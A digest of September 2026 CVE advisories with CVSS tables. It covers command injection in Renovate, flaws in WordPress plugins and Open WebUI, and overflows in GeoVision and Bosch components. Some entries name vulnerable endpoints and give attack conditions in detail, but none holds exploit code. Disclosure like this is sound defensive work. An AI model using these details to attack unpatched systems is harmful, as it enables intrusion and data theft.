Renovate before 44.14.7 contains a command injection vulnerability in the Maven Wrapper manager that allows attackers to execute arbitrary commands by specifying a malicious distributionType parameter in maven-wrapper.properties. Attackers can inject shell commands through unescaped distributionType values to achieve remote code execution when Renovate processes Maven Wrapper updates in binarySource=docker mode.

### CVE-2026-88886

| 項目 | 値 |
|------|-----|
| CVSS | `8.5` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-10T14:17:17.517 |

Renovate is a dependency update automation tool. In versions before 44.14.7 (and in Mend Renovate CE/EE distributions before 15.4.0, and the mend-renovate-enterprise-edition Helm chart before 10.4.0), the manager/gradle-wrapper module does not escape the distributionUrl value read from a repository's gradle/wrapper/gradle-wrapper.properties file before invoking the Gradle Wrapper CLI. In self-hosted deployments configured with binarySource=docker and allowedUnsafeExecutions=['gradleWrapper', ...], a repository that supplies a crafted distributionUrl (for example, appending a shell metacharacter and command) can cause arbitrary commands to be executed as the Renovate user when Renovate processes a Gradle Wrapper update. The issue is fixed in Renovate 44.14.7; as a workaround, remove 'gradleWrapper' from allowedUnsafeExecutions.

### CVE-2026-84063

| 項目 | 値 |
|------|-----|
| CVSS | `8.5` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-434` |
| Published | 2026-09-10T03:17:00.370 |

BurgerEditor 3.2.0 through 3.4.0 contains an issue with unrestricted upload of file with dangerous type. If this vulnerability is exploited, an arbitrary file may be uploaded by an attacker who can log in to the product, potentially allowing arbitrary PHP code to be executed may be caused.

### CVE-2026-77974

| 項目 | 値 |
|------|-----|
| CVSS | `8.5` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-306` |
| Published | 2026-09-09T16:17:06.053 |

After spoofing the device and obtaining one user confirmation, an attacker may be able to cause the application to transmit firmware through an unauthenticated and unsigned update channel.

### CVE-2026-88890

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:L/SC:H/SI:N/SA:L/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-10T14:17:18.200 |

OpenPanel through commit cd24bb8 contains an SQL injection vulnerability in the analytics filter builder that fails to validate profile.* filter column identifiers before interpolating them into ClickHouse WHERE clauses. An authenticated attacker with project-scoped read or root export credentials can inject arbitrary ClickHouse SQL to bypass project isolation and read other organizations' analytics data and profile PII via blind boolean oracle techniques.

### CVE-2026-42805

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-121` |
| Published | 2026-09-10T09:17:02.013 |

A stack-based buffer overflow vulnerability exists in the Bosch Sensortec BHI385 SensorAPI (C library) within the debug message parser function bhi385_parse_debug_message (located in bhi385_parse.c). 

The function parses FIFO events and extracts an 8-bit message length directly from the attacker-controlled event payload (callback_info->data_ptr[0]) without enforcing bounds checks or clamping the value.

When copying the payload into a fixed-size stack buffer of 17 bytes (uint8_t debug_msg[17]) via memcpy, providing a length byte greater than 16 causes the function to write past the allocated stack boundary. 

This memory corruption can be triggered by a malicious or compromised sensor or bus participant, leading to a firmware crash, Denial of Service (DoS), or potentially the execution of arbitrary code via adjacent stack data corruption.

### CVE-2026-82563

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-290` |
| Published | 2026-09-09T16:17:11.567 |

An attacker could impersonate the camera and place themselves in a man-in-the-middle or device-emulation position. This permits manipulation of device status responses, observation of application requests, and potential triggering of firmware-update behavior.

### CVE-2026-88883

| 項目 | 値 |
|------|-----|
| CVSS | `8.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-532` |
| Published | 2026-09-10T14:17:16.997 |

Renovate is an automated dependency update tool. In versions before 44.14.4 (and Mend Renovate CE/EE images before 15.4.0 and the mend-renovate-enterprise-edition Helm chart before 10.4.0), log sanitisation for TLS private keys used for Mutual TLS was incomplete. While the value of hostRules[].httpsPrivateKey was redacted in the field itself, the same private key value was not redacted if it also appeared elsewhere — for example in another configuration option or in a log message under a key other than httpsPrivateKey — causing the full private key to be written to Renovate's logs in cleartext. This affects deployments that configure Mutual TLS through hostRules[].httpsPrivateKey without passing the value through the documented `secrets` configuration. Anyone able to read the resulting logs can recover the private key. The issue is fixed in Renovate 44.14.4, which redacts any value supplied as hostRules[].httpsPrivateKey wherever it appears in the logs; as a workaround, supply the key via the `secrets` configuration.

### CVE-2026-82925

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2026-09-10T07:17:03.620 |

The Site Reviews WordPress plugin before 8.3.0 does not prevent request data from being deserialized, and derives the key protecting that data by padding out the site's WordPress nonce key, which makes the key publicly computable on installs where that key is absent, left at its sample value, or too short to be secret. This allows unauthenticated users to inject arbitrary PHP objects on such installs. The Site Reviews WordPress plugin before 8.3.0's own code contains no chain onward from the injected object, so how far it reaches depends on the other code present on the site.

### CVE-2026-87016

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-155;CWE-287` |
| Published | 2026-09-09T22:18:46.720 |

Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.6.41 until 0.11.1, get_user_by_oauth_sub and get_user_by_scim_external_id in backend/open_webui/models/users.py used JSON contains matching that compiled to SQL LIKE substring matching on SQLite. An OAuth subject containing percent or underscore wildcard characters could resolve to a different stored identity, potentially selecting an administrator account and issuing the attacker that account's session; PostgreSQL deployments were not affected. This issue is fixed in version 0.11.1.

### CVE-2026-87874

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2026-09-09T17:17:53.093 |

A flaw was found in the memcached cache plugin of the community.general Ansible
collection. Although its documentation states that records are stored in JSON
format, the plugin performs no explicit serialization and relies on
python-memcached, which pickles values on write and unpickles them on read.
Because memcached is unauthenticated and cache keys are predictable, an attacker
able to reach a network-exposed or shared memcached instance can write a crafted
pickle payload that is deserialized and executed on the Ansible controller when
the poisoned fact cache is next read, leading to remote code execution.

### CVE-2026-18147

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-09T17:17:17.007 |

A flaw was found in FreeIPA. An unauthenticated remote attacker could exploit a DOM Cross-Site Scripting (XSS) vulnerability in the FreeIPA/IdM Web UI password reset page. By enticing a victim to click a specially crafted link and complete a password reset, the attacker could inject and execute arbitrary JavaScript code. This allows the attacker to perform actions within the victim's authenticated session, potentially leading to full administrative control if an IdM administrator is targeted.

### CVE-2026-42807

| 項目 | 値 |
|------|-----|
| CVSS | `8.0` |
| Vector | `CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-122` |
| Published | 2026-09-10T09:17:02.250 |

A heap-based buffer overflow vulnerability in the PC bridge protocol decoder of BoschSensortec COINES_SDK (versions 2.10 through 2.12.2) allows attackers to cause a denial of service (process crash) or potentially execute arbitrary code. 

The bridge decoder ({{bridge_decoder.c}}) trusts the packet length field provided by the external device and forwards it to the host response queue ({{mqueue_add_data}}) without validating the bounds of the destination buffer. 

A malicious or compromised USB or Bluetooth Low Energy (BLE) peripheral can advertise a payload size up to ~3 KB, which exceeds the default queue slot size of 255 bytes. 

This results in an unbounded heap overwrite ({{memcpy}}), corrupting adjacent heap metadata on the host system when processing the device's response.

### CVE-2026-14873

| 項目 | 値 |
|------|-----|
| CVSS | `8.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-862` |
| Published | 2026-09-10T04:17:45.480 |

The Bulk Password Reset plugin for WordPress is vulnerable to privilege escalation via account takeover in all versions up to, and including, 1.3.3. This is due to the plugin not properly validating a user's identity prior to updating their details like arbitrary user passwords, including administrator passwords, to a known plugin-configured custom value, enabling full account takeover of the site. This makes it possible for authenticated attackers, with subscriber-level access and above, to change arbitrary user's email addresses, including administrators, and leverage that to reset the user's password and gain access to their account.

### CVE-2026-84042

| 項目 | 値 |
|------|-----|
| CVSS | `7.8` |
| Vector | `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-269` |
| Published | 2026-09-10T09:17:03.260 |

A flaw was found in crun. When crun is built with libkrun and a container is started rootful with passt networking (krun.use_passt), crun can execute attacker-controlled payload from the container image with host root privileges. The issue is a regression in crun 1.29. It affects crun >= 1.29

### CVE-2026-19584

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-94;CWE-1336` |
| Published | 2026-09-10T03:17:00.063 |

Velociraptor allows for the creation of notebook backups in its default enabled daily backup feature. When Velociraptor restores the backup, the notebook cell content is interpolated into a template with no ACL checks. This allows a malicious user with NOTEBOOK_EDITOR permission to plant a VQL query which will be evaluated at elevated permissions if the notebook's backup is subsequently restored.

### CVE-2026-87996

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-367;CWE-918` |
| Published | 2026-09-09T22:18:47.857 |

Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.9.6 until 0.11.1, SafePlaywrightURLLoader in backend/open_webui/retrieval/web/utils.py validated a user-controlled hostname in Python and then let the Playwright browser resolve it again in the sync and async request interceptors. An authenticated user controlling authoritative DNS could return a public address to validation and an internal address to the browser, exposing responses from internal services or cloud metadata through web search or URL ingestion. This issue is fixed in version 0.11.1.

### CVE-2026-15913

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-23` |
| Published | 2026-09-09T22:17:11.367 |

In versions prior to 7.10.2 a path traversal vulnerability in the /attachRemoteFiles endpoint of Fortra's GoAnywhere MFT allows Web Users with both Secure Folders and Secure Mail permissions to escape their sandboxed home directory, achieving arbitrary file read.

### CVE-2026-42804

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-121` |
| Published | 2026-09-10T09:17:01.880 |

A stack-based buffer overflow vulnerability exists in the Bosch Sensortec BHI360 SensorAPI(C-Library) in versions up to and including commit d6b200416a.

The vulnerability is located within the FIFO parsing and debug logging subsystem inside the function bhi360_parse_debug_message() in bhi360_parse.c (lines 1852-1875). 

The parser trusts the first payload byte of a debug frame as the message length (msg_length) and copies that many bytes into a fixed-size 17-byte stack buffer (debug_msg) via memcpy without performing any bounds checking.

A locally or physically positioned attacker (e.g., via a malicious sensor, counterfeit hardware module, or a Man-in-the-Middle on the communication bus) can exploit this vulnerability by injecting a crafted debug frame with a length byte exceeding 16.

This corrupts adjacent stack data, including the saved return address.

Furthermore, because the overflowed buffer is subsequently passed to a printf-style logging sink, the attacker can supply format string specifiers (e.g., %n) to execute arbitrary code on the host microcontroller/SoC or cause a reliable system crash (Denial of Service).

### CVE-2026-6285

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-640` |
| Published | 2026-09-10T14:17:05.850 |

Weak Password Recovery Mechanism for Forgotten Password vulnerability in Ankaref Innovation and Technology Inc. LIBRID/LIBREF allows Password Recovery Exploitation.

This issue affects LIBRID/LIBREF: from 2.01.0.2183 through 10092026. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2026-9166

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-22` |
| Published | 2026-09-10T13:20:33.800 |

Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability in GIS Informatics GisLab Laboratory Management System allows Path Traversal.

This issue affects GisLab Laboratory Management System: from 1.4.03 before 1.5.

### CVE-2026-88290

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400` |
| Published | 2026-09-10T09:17:06.133 |

GeoVision GV-LPC2211 V1.14 (260903) allows unauthenticated clients to declare unbounded VLSVR frame lengths and indefinitely delay blocking receives, allowing remote exhaustion of memory, connection, and worker resources.

### CVE-2026-88289

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-121` |
| Published | 2026-09-10T09:17:06.017 |

GeoVision GV-LPC2211 V1.14 (260903) fails to validate attacker-controlled variable-length fields before copying them into fixed-size stack buffers in multiple VLSVR request handlers, allowing an unauthenticated remote attacker to crash the VLSVR service.

### CVE-2026-88287

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-121` |
| Published | 2026-09-10T09:17:05.787 |

GeoVision GV-LPC2211 V1.13 fails to bound the number of Scopes tokens in unauthenticated ONVIF WS-Discovery Probe requests, allowing a remote attacker to corrupt stack control state and crash the discovery process.

### CVE-2026-88286

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400` |
| Published | 2026-09-10T09:17:05.673 |

GeoVision GV-LPC2211 V1.13 improperly manages PTZ connection state, allowing an unauthenticated remote client to block the accept loop and prevent new PTZ connections.

### CVE-2026-77771

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-287` |
| Published | 2026-09-10T07:17:03.047 |

The miniOrange 2FA  WordPress plugin before 6.3.1, miniOrange 2FA  WordPress plugin before 19.3 does not scope its second-factor attempt limit to the account being attacked, keying it instead to an identifier the client supplies and can change at will, allowing an attacker who already knows a victim's password to make unlimited one-time-passcode guesses and defeat the second factor. A second validation endpoint applies no attempt limit at all.

### CVE-2026-19439

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-200` |
| Published | 2026-09-10T07:17:02.730 |

The Ultimate Gift Cards for WooCommerce WordPress plugin before 3.2.10 does not have any authorisation check when displaying gift card details, allowing unauthenticated users to retrieve the gift cards attached to arbitrary orders and disclose customer personal data, balances, dates and, in 3.2.9, the live redemption code, which anyone holding it can spend.

Versions from 3.0.3 to 3.2.8 disclose the same data without the redemption code.

### CVE-2026-19436

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| Weaknesses | `CWE-284` |
| Published | 2026-09-10T07:17:02.620 |

The Ultimate Gift Cards for WooCommerce WordPress plugin before 3.2.10 does not reconcile the value of the gift card coupon it issues against the amount actually collected at checkout, allowing unauthenticated users to obtain store credit worth more than they paid.

### CVE-2026-15019

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-22` |
| Published | 2026-09-10T04:17:45.967 |

The Direct Download for WooCommerce plugin for WordPress is vulnerable to Directory Traversal in all versions up to, and including, 1.19 via the (top-level include) function. This makes it possible for unauthenticated attackers to read the contents of arbitrary files on the server, which can contain sensitive information. The product ownership check only verifies that some free, virtual, downloadable product exists on the site — not that the requested file path belongs to that product's configured downloads — making exploitation viable on any WooCommerce site with at least one such product.

### CVE-2026-87011

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-405;CWE-770` |
| Published | 2026-09-09T21:17:05.847 |

Open WebUI is an extensible, feature-rich, and user-friendly self-hosted AI platform. From 0.9.0 until 0.11.1, the unauthenticated POST /oauth/backchannel-logout handler in backend/open_webui/utils/oauth.py fetched the OIDC discovery document and signing keys before validating a submitted logout token. Each request repeated uncached network fetches, and the signing-key lookup blocked the async event loop, so requests carrying invalid tokens could stall the single-worker instance and amplify traffic to the identity provider when ENABLE_OAUTH_BACKCHANNEL_LOGOUT was enabled. This issue is fixed in version 0.11.1.

### CVE-2026-79324

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| Weaknesses | `CWE-639;CWE-862` |
| Published | 2026-09-09T20:20:43.040 |

Missing authorization in the Address Delete controller in Mageplaza GDPR for Magento 2 (mageplaza/module-gdpr) through 4.2.9 allows remote unauthenticated attackers to delete any customer's saved address, and to erase all stored addresses by iterating the address id, via a GET request to /customer/address/delete/id/{id}. The controller extends the legacy Action class instead of AbstractAccount, so no authentication, ownership or form key check is enforced.

### CVE-2026-73786

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `N/A` |
| Published | 2026-09-09T20:20:33.493 |

A vulnerability in the web-based management interface of CPPM could allow an unauthenticated remote attacker to conduct a Denial-of-Service (DoS) attack. Successful exploitation could allow an attacker to cause instability and degrade performance of the vulnerable CPPM server.

### CVE-2026-79323

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-200` |
| Published | 2026-09-09T19:17:48.020 |

Information disclosure in the blogComments GraphQL query in Magefan Blog GraphQL for Magento 2 (magefan/module-blog-graph-ql) through 2.2.1 allows remote unauthenticated attackers to obtain blog commenter email addresses and internal customer and admin identifiers via a POST request to /graphql.

### CVE-2026-87853

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-187` |
| Published | 2026-09-09T17:17:52.827 |

A flaw was found in SSSD's IdP authentication provider. The eval_access_token_buf() function compares the OIDC subject identifier using strncmp() with the authenticated user's identifier length, performing a prefix comparison instead of an exact match. An attacker whose IdP identifier is a strict prefix of a target user's identifier can authenticate as the target user.

### CVE-2026-80924

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `N/A` |
| Published | 2026-09-09T17:17:47.653 |

In the Linux kernel, the following vulnerability has been resolved:

crypto: krb5 - use kfree_sensitive() for derived key buffers

crypto_krb5_prepare_encryption() and crypto_krb5_prepare_checksum()
free the buffer holding the freshly derived keys with plain kfree(),
leaving the key material behind in the freed slab object.

### CVE-2026-22591

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400;CWE-674` |
| Published | 2026-09-09T16:17:02.563 |

eprosima Fast DDS is a C++ implementation of the DDS (Data Distribution Service) standard of the OMG (Object Management Group). Prior to versions 2.6.12, 2.14.6, 3.2.4, and 3.4.3, Fast DDS’s implementation of SQL‑based content filtering (DDSSQLFilter) allows any participant in a DDS domain to remotely crash other Fast DDS participants by sending a single crafted SEDP `DATA` submessage whose `PID_CONTENT_FILTER_PROPERTY.filterExpression` contains a deeply nested filter expression. Versions 2.6.12, 2.14.6, 3.2.4, and 3.4.3 fix the issue.

### CVE-2026-88888

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:4.0/AV:L/AC:H/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-10T14:17:17.870 |

Renovate before 44.14.7 contains a command injection vulnerability in the Mix manager when processing private dependencies with unescaped organization parameters. Attackers can inject shell metacharacters through malicious package names to execute arbitrary commands as the Renovate user in binarySource=docker mode.

### CVE-2026-88885

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:4.0/AV:L/AC:H/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-10T14:17:17.350 |

Renovate before 44.14.7 contains a command injection vulnerability in the gomod manager when processing unescaped depName parameters in import-path update commands with binarySource=docker mode. Attackers can inject shell metacharacters through malicious dependency names to execute arbitrary commands as the Renovate user during Go module major version updates with postUpdateOptions gomodUpdateImportPaths enabled.

### CVE-2026-88891

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-269` |
| Published | 2026-09-10T14:17:18.340 |

OpenPanel fails to enforce read-only project access level on 26 of 29 mutating procedures, allowing read-level members to modify, delete, and publish project data. Attackers with explicit read-only access can delete reports and dashboards, schedule entire projects for deletion, publish private analytics to public share links, and modify alerting rules by exploiting missing access level validation in mutation resolvers.

### CVE-2026-88282

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-10T09:17:05.227 |

GeoVision GV-LPC2211 V1.13 allows an administrator-controlled FTP username containing shell metacharacters to be executed as arbitrary root commands during a subsequent FTP-account update.

### CVE-2026-88276

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-10T09:17:04.560 |

GeoVision GV-LPC2211 V1.13 allows administrator-controlled WEP key values containing shell syntax to execute arbitrary commands as root.

### CVE-2026-88275

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-10T09:17:04.450 |

GeoVision GV-LPC2211 V1.13 allows an administrator-controlled WPA-PSK containing shell syntax to execute arbitrary commands as root when wireless configuration is applied.

### CVE-2026-88274

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-10T09:17:04.343 |

GeoVision GV-LPC2211 V1.13 allows an administrator-controlled wireless SSID containing shell syntax to execute arbitrary commands as root.

### CVE-2026-88273

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-10T09:17:04.230 |

GeoVision GV-LPC2211 V1.13 allows an administrator-controlled PPPoE username to escape a sourced shell configuration assignment and execute arbitrary commands as root.

### CVE-2026-88272

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2026-09-10T09:17:04.117 |

GeoVision GV-LPC2211 V1.13 allows an administrator-controlled username containing shell metacharacters to be executed as arbitrary root commands when the stored username is later deleted.

### CVE-2026-81431

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-269` |
| Published | 2026-09-10T07:17:03.243 |

The Registration Form for WooCommerce WordPress plugin before 1.1.3 does not validate that the form referenced during registration is a legitimate registration form, reading the permitted-role allow-list from an arbitrary attacker-controlled post instead. A user able to create a post (Contributor and above) can therefore register a new account with an arbitrary role, including Administrator, leading to full site takeover. This is an incomplete fix of CVE-2026-54807.

### CVE-2026-0310

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N/E:U/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:N/R:U/V:D/RE:M/U:Red` |
| Weaknesses | `CWE-787` |
| Published | 2026-09-10T06:17:04.450 |

A buffer overflow vulnerability in the XML processing functionality of Palo Alto Networks PAN-OS® software enables an unauthenticated attacker with network access to the management web or dataplane interface to cause a denial of service (DoS) condition on VM-Series firewalls or execute arbitrary code with root privileges on the PA-Series firewalls.

The security risk posed by this issue is minimized when the management interface is restricted to only trusted internal IP addresses according to our recommended  best practice deployment guidelines https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431 . 

Panorama is impacted by this vulnerability.

### CVE-2026-76562

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-10T04:18:16.643 |

The Sidebar Manager Light plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'sbm_description' parameter in all versions up to, and including, 1.18 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

### CVE-2026-73787

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2026-09-09T20:20:33.607 |

